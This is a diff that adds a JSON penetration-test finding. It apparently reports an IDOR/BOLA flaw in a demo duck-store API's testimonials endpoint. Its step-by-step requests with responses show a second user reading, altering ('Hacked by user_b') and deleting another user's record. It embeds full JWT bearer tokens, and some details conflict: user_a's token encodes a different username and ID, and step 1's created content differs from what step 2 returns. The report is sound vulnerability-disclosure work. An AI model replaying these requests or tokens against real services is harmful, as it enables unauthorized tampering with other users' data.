@@ -1,0 +1,49 @@
+{
+  "vulnerability": "IDOR/BOLA on /api/v1/testimonials/{id}",
+  "target": "https://duck-store.escape.tech",
+  "tested_endpoint": "GET/PUT/DELETE https://duck-store.escape.tech/api/v1/testimonials/9",
+  "user_a": {
+    "username": "verify_user_a_123",
+    "user_id": "7b8fddd4-b5ef-4f6c-b1df-0d38d81b05b5",
+    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzkwNTk2M2UtYzVhZS00YjdmLTg2YjctNzAwZmQ2ZDRkOTlkIiwidXNlcm5hbWUiOiJ2YXB0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY2ODY5M30.Vf_2xplwfqQw7o9VLAMI3dLctn4E7X-tsz1tkLsEFBA"
+  },
+  "user_b": {
+    "username": "vaptuser2",
+    "user_id": "093d6a13-aca6-47f9-a556-f2a810769386",
+    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDkzZDZhMTMtYWNhNi00N2Y5LWE1NTYtZjJhODEwNzY5Mzg2IiwidXNlcm5hbWUiOiJ2YXB0dXNlcjIiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY2ODcxOX0.4cbeVpJHPyyy3J5w9RUmZJSYSPoXTkMN21GqiD_IUek"
+  },
+  "reproduction_steps": [
+    {
+      "step": 1,
+      "action": "Create testimonial as user_a",
+      "request": "POST /api/v1/testimonials with token_a",
+      "payload": {"content": "Test from user_a", "rating": 5},
+      "response_status": 200,
+      "response_body": "Created testimonial ID 9 owned by user_a (verify_user_a_123)"
+    },
+    {
+      "step": 2,
+      "action": "GET testimonial as user_b (cross-user read)",
+      "request": "GET /api/v1/testimonials/9 with token_b",
+      "response_status": 200,
+      "response_body": "{\"id\":9,\"user_id\":\"7b8fddd4-b5ef-4f6c-b1df-0d38d81b05b5\",\"user\":{\"id\":\"7b8fddd4-b5ef-4f6c-b1df-0d38d81b05b5\",\"username\":\"verify_user_a_123\"},\"guest_name\":null,\"guest_role\":null,\"guest_avatar_url\":null,\"content\":\"Test testimonial by verify_user_a_123\",\"rating\":5,\"is_featured\":false,\"created_at\":\"2026-09-29T07:26:00.690450\",\"name\":\"verify_user_a_123\",\"role\":\"Duck Lover\",\"avatar_url\":null}"
+    },
+    {
+      "step": 3,
+      "action": "PUT (modify) testimonial as user_b (cross-user write)",
+      "request": "PUT /api/v1/testimonials/9 with token_b",
+      "payload": {"content": "Hacked by user_b", "rating": 1},
+      "response_status": 200,
+      "response_body": "{\"id\":9,\"user_id\":\"7b8fddd4-b5ef-4f6c-b1df-0d38d81b05b5\",\"user\":{\"id\":\"7b8fddd4-b5ef-4f6c-b1df-0d38d81b05b5\",\"username\":\"verify_user_a_123\"},\"guest_name\":null,\"guest_role\":null,\"guest_avatar_url\":null,\"content\":\"Hacked by user_b\",\"rating\":1,\"is_featured\":false,\"created_at\":\"2026-09-29T07:26:00.690450\",\"name\":\"verify_user_a_123\",\"role\":\"Duck Lover\",\"avatar_url\":null}"
+    },
+    {
+      "step": 4,
+      "action": "DELETE testimonial as user_b (cross-user delete)",
+      "request": "DELETE /api/v1/testimonials/9 with token_b",
+      "response_status": 204,
+      "response_body": ""
+    }
+  ],
+  "impact": "Any authenticated user can read, modify, and delete any other user's testimonials by simply changing the testimonial ID in the URL. No authorization checks are performed to verify ownership.",
+  "severity": "high"
+}
